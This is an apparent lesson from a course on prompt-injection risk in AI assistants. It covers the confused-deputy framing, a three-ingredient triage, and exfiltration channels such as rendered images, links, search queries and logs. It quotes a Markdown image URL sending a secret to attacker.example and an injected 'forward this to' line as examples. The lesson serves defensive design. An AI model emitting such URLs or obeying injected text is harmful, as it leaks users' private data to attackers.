There is a question that sorts these systems into "annoying if it goes wrong"
and "do not ship this", and it is not about the attack. It is about you.

**Once the model has been persuaded, what can it do?**

An assistant that can only produce text can, at worst, produce wrong text. An
assistant that can send email can send email. The injection is the same. The
outcome is not remotely the same, and the difference is entirely in the
capability you granted.

## The confused deputy

The old name for this pattern is the best one. A *confused deputy* is a program
acting with authority on someone's behalf that gets talked into using that
authority for someone else.

Your assistant is a deputy. You gave it your credentials, your database
connection, your mailbox. It does not have opinions about who it is helping — it
has a context window, and whatever is in it.

That framing kills a tempting line of thinking early. The question is never "how
would an attacker get access to the database?" The attacker does not need access
to the database. **You already gave it to the deputy.** The attacker needs the
deputy to ask on their behalf, and the deputy reads text they can write.

## The three ingredients

A useful way to look at any workflow is to check for three things. Individually
they are ordinary. Together they are a channel out.

> **1. Access to something private.** Customer records, internal documents, the
> user's files, a mailbox, credentials.
>
> **2. Exposure to text someone else wrote.** Anything from L3's carrier list.
>
> **3. A way to send data outward.** A tool that posts, an email, a webhook — or
> anything that causes a fetch to a URL the attacker chooses.

Any two are usually survivable. A system with private data and outbound
capability, reading only text you control, is an ordinary application. A system
reading hostile text with no private data and no outbound path can be made to
say something wrong, which is a content problem.

All three, and the injected instruction has everything it needs: read the
private thing, put it in the outbound thing, done. No exploit, no memory
corruption, no privilege escalation. Just a deputy following instructions.

When you audit a workflow, look for all three in one place. That is the fastest
triage available.

## Exfiltration channels people forget

Ingredient three is the one that gets underestimated, because people picture an
explicit "send email" tool and conclude they do not have one.

**Rendered images.** The model writes `![](https://attacker.example/x?d=SECRET)`.
Your chat interface renders Markdown, so the browser fetches that URL without
anyone clicking. The data is in the attacker's access log. This is the classic
one, and it is quiet.

**Links a user will plausibly click.** Less automatic, more reliable than you
would like, especially when the link is presented as *"click here for the full
report"*.

**Any tool with a URL parameter.** A fetch tool, a webhook, a "check this link"
utility. It does not have to be named `send_data` to send data.

**Search queries.** A tool that searches an external service transmits its query
to that service. The query is chosen by the model.

**The answer itself.** If a human reads the output and acts on it, the human is
the channel. A summary that says *"forward this to accounts@attacker.example"*
does not need any tool at all.

**Error messages and logs.** If your logging captures model output and somebody
else can read those logs, that is a slower channel with the same destination.

The general form: **anything that turns model output into a network request, or
into a human action, is an outbound path.** Enumerate on that basis, not on
which functions have alarming names.

## Rank your own workflow

For each thing your system can do, ask three questions and write down the
answers:

1. **Is it reversible?** Reading a file, yes. Deleting one, no. Sending an
   email, definitely not.
2. **Who notices?** A wrong answer on screen is seen immediately. A row quietly
   written to a table is not.
3. **What is the worst single call?** Not a chain of ten steps — one call, with
   the worst arguments an attacker could choose.

That third question is the useful one, because the mitigations in L6 mostly work
by making the worst single call less bad.

## Where Lrnon sits

Worth being concrete, because it is a live example of the triage above.

`/api/sky` reads a retrieval index and calls one model. It holds a service
credential for the database, which is used for exactly one thing: incrementing a
spend counter. It cannot read learner records, cannot write content, cannot
send anything, and has no fetch tool.

Run the three ingredients against it:

- **Private data?** Barely — the index is public lesson text, published on the
  site.
- **Untrusted input?** Potentially, per L3.
- **Outbound path?** The answer text, which reaches one person who asked a
  question.

Two of three, weakly. The worst available outcome is a wrong answer carrying a
citation, which the citation check makes visible rather than silent.

That is not because anybody was clever. It is because the assistant was never
given anything else to do — and if a future version gains a tool, this analysis
has to be redone before that ships, not after.

## Try it now (8 minutes)

List every action your system can take. For each, write the worst single call an
attacker could produce, assuming they fully control the arguments.

Then sort the list by "how long until a human would notice". The top of that
list — irreversible and unnoticed — is where your attention belongs, regardless
of how unlikely the attack path looks.

## Recap

Impact is capability. Look for three ingredients together — private access,
untrusted text, an outbound path — because that combination is what converts a
wrong answer into a breach. Enumerate outbound paths by asking what turns model
output into a network request or a human action, which catches rendered images
and search queries as well as anything named "send". Then rank your actions by
reversibility and by how long a person would take to notice.
